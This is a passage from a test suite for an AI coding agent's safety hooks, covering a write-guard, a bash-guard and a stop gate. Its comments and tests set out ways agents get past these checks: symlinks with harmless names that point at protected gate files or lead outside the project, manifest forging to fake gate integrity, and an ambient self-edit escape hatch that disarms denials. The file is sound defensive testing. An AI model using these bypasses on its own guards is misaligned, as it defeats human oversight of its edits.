    `export const VALIDATE_STEPS = []\nexport const STOP_HOOK_STEPS = [['rls', 'node -e "console.log(process.env.X_MSG)"']]\n`,
  )
  const r = runHook(
    'stop-validate-gate.mjs',
    { stop_hook_active: false },
    {
      env: { X_MSG: 'rls-isolation: SKIPPED - database unreachable' },
    },
  )
  assert.equal(r.code, 0, r.stderr)
  assert.ok(r.stderr.includes('skipped layers'), r.stderr)
  assert.ok(r.stderr.includes('SKIPPED'), r.stderr)
})

// ── symlink shadowing: the write-guard judges the DESTINATION, not the name ───
// A link whose name is innocuous but whose target is protected used to walk straight
// through: the RAW tool path was matched against WRITE_PROTECTED, so `ln -s
// tools/validate.mjs shim` + `Write shim` edited the gate runner unguarded — and from
// there .harness/manifest.json can be forged so gate-integrity re-hashes to green.
test('write-guard: a symlink pointing at a protected file is DENIED under its innocuous name', (t) => {
  writeFileSync(join(proj, 'tools/validate.mjs'), '// the real gate runner\n')
  if (!trySymlink('tools/validate.mjs', join(proj, 'shim.mjs'))) {
    t.skip('symlinkSync needs privileges on this Windows runner')
    return
  }
  const r = runHook('pretool-write-guard.mjs', {
    tool_name: 'Write',
    tool_input: { file_path: 'shim.mjs', content: 'process.exit(0)\n' },
  })
  assert.ok(denied(r), 'a symlink to the gate runner must be denied, not approved by its name')
})

test('write-guard: an exempt-LOOKING link name cannot smuggle content into a checked path', (t) => {
  mkdirSync(join(proj, 'apps/mobile/src/features/notes'), { recursive: true })
  writeFileSync(join(proj, 'apps/mobile/src/features/notes/data.ts'), 'export const q = 1\n')
  // *.test.ts is content-check-exempt (test bodies legitimately reference banned
  // patterns) — but the bytes here land in the mobile bundle, which must never import a
  // server/database module (feature code reaches data through the tRPC client).
  if (!trySymlink('apps/mobile/src/features/notes/data.ts', join(proj, 'sneaky.test.ts'))) {
    t.skip('symlinkSync needs privileges on this Windows runner')
    return
  }
  const r = runHook('pretool-write-guard.mjs', {
    tool_name: 'Write',
    tool_input: { file_path: 'sneaky.test.ts', content: "import { sql } from 'postgres'\n" },
  })
  assert.ok(denied(r), 'an exempt name must not buy an exemption for bytes landing in the mobile bundle')
})

test('write-guard: a link out of the project tree is DENIED (path-scoped guards cannot see it)', (t) => {
  const outside = mkdtempSync(join(tmpdir(), 'epah-outside-'))
  if (!trySymlink(outside, join(proj, 'escape'))) {
    rmSync(outside, { recursive: true, force: true })
    t.skip('symlinkSync needs privileges on this Windows runner')
    return
  }
  const r = runHook('pretool-write-guard.mjs', {
    tool_name: 'Write',
    tool_input: { file_path: 'escape/anything.ts', content: 'export const x = 1\n' },
  })
  assert.ok(denied(r), 'writing through a link out of the tree bypasses every path-scoped guard')
  rmSync(outside, { recursive: true, force: true })
})

test('write-guard: an ordinary file is still approved (the resolver must not over-block)', () => {
  mkdirSync(join(proj, 'apps/mobile/src'), { recursive: true })
  const r = runHook('pretool-write-guard.mjs', {
    tool_name: 'Write',
    tool_input: {
      file_path: 'apps/mobile/src/App.tsx',
      content: 'export const App = () => null\n',
    },
  })
  assert.ok(!denied(r), `ordinary source writes must still pass: ${r.stdout} ${r.stderr}`)
})

// ── the suite's own environment (0.4.0) ──────────────────────────────────────────
//
// THE DEFECT THIS CLOSES. Every deny case above spawns a hook, and the spawn used to
// inherit the parent environment wholesale. HARNESS_ALLOW_SELF_EDIT=1 is the documented
// human escape hatch that makes every write rule return no deny — and it is also how you
// work ON this repository, since editing the enforcement surface requires it exported. So a
// maintainer's own session silently disarmed 138 assertions: they did not detect a broken
// guard, they stopped asking. The suite checked LESS locally than in CI, which is the exact
// shape of the porosity scripts/ci/upgrade-lane.sh unsets script-wide for.
//
// Sanitizing runHook fixes it once. These two make it stay fixed, because the failure is
// invisible by construction: a leaked hatch produces a suite that passes fewer things, and
// nothing about "fewer" looks different from "fine".
const HATCH = 'HARNESS_ALLOW_SELF_EDIT'
const PROTECTED_WRITE = { tool_input: { command: 'echo {} > tools/validate.floor.json' } }

test('ENV HYGIENE: a deny still denies with the escape hatch set AMBIENTLY', () => {
  // The regression test proper. It sets the hatch in this process's own environment —
  // exactly the maintainer's situation — and asserts a known-protected write is still
  // refused. It can only pass while runHook keeps stripping it.
  const prior = process.env[HATCH]
  process.env[HATCH] = '1'
  try {
    const r = runHook('pretool-bash-guard.mjs', PROTECTED_WRITE)
    assert.ok(
      denied(r),
      `an ambient ${HATCH} reached the hook and disarmed it — runHook must strip it, or every deny case in this file asserts nothing:\n${r.stdout}${r.stderr}`,
    )
  } finally {
    if (prior === undefined) delete process.env[HATCH]
    else process.env[HATCH] = prior
  }
})

test('ENV HYGIENE: the escape hatch still WORKS when a case passes it deliberately', () => {
  // The other direction, and the reason the fix is "strip the ambient value" rather than
  // "ban the variable": the hatch is a real, documented behaviour with real callers (the
  // canary CI lane sets it). Stripping it from the baseline must not delete its proof.
  const r = runHook('pretool-bash-guard.mjs', PROTECTED_WRITE, { env: SELF_EDIT })
  assert.ok(
    !denied(r),
    `${HATCH}=1 passed explicitly must still open the guard:\n${r.stdout}${r.stderr}`,
  )
})
